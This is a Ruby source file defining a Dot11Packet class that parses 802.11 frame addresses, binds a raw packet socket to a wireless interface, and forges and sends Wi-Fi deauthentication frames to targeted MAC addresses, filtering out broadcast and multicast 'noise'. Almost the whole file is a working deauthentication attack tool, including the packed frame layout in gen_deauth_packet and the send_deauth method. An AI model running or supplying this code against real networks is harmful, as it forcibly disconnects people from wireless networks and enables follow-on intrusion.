class Dot11Packet
  attr_reader :addr1, :addr2

  def initialize(packet=nil)
    @body = packet
    @socket = nil
    @noise = ['ff:ff:ff:ff:ff:ff', '00:00:00:00:00:00', '33:33:00:', '33:33:ff:', '01:80:c2:00:00:00', '01:00:5e:']
    @valid_mac_regex = /^([0-9a-fA-F]{2}[:-]){5}[0-9a-fA-F]{2}$/i
  end

  def parse
    @addr1 = @body[40...46].unpack('H*')[0].scan(/.{2}/).join(':')
    @addr2 = @body[46...52].unpack('H*')[0].scan(/.{2}/).join(':')
  end

  def config_socket(iface, excluded_mac=nil)
    @socket = bind_socket(iface)
    @noise << excluded_mac if excluded_mac
  end

  def send_deauth(mac1, mac2, mac3)
    pkt = gen_deauth_packet(mac1, mac2, mac3)
    @socket.write(pkt)
  end

  def add_noise(addresses)
    @noise = [@noise, addresses].reduce([], :concat) if addresses.any?
  end

  def is_noise?
    @noise.include?(@addr1) || @noise.include?(@addr2)
  end

  def valid_macs?
    (@addr1 =~ @valid_mac_regex) && (@addr2 =~ @valid_mac_regex)
  end

  def broadcast?
    @addr1.eql? "ff:ff:ff:ff:ff:ff"
  end

  private

  def bind_socket iface
    socket = Socket.new(Socket::AF_PACKET, Socket::SOCK_RAW, 0x0300)
    ifreq = [iface].pack('a32')
    socket.ioctl(0x89_33, ifreq)

    sll = [Socket::AF_PACKET].pack('s')
    sll << ( [0x03_00].pack('s') )
    sll << ifreq[16..20]
    sll << ("\x00" * 12)
    socket.bind sll
    socket
  end

  # Hack to generate Dot11 DeAuth packets
  def gen_deauth_packet(mac1, mac2, mac3)
    m1 = mac1.split(':').map(&:hex)
    m2 = mac2.split(':').map(&:hex)
    m3 = mac3.split(':').map(&:hex)
    [0, 0, 8, 0, 49152, 0, m1, m2, m3, 0, 0, 7, 0, 0].flatten.pack('ccvLnSCCCCCCCCCCCCCCCCCCccclc')
  end
end
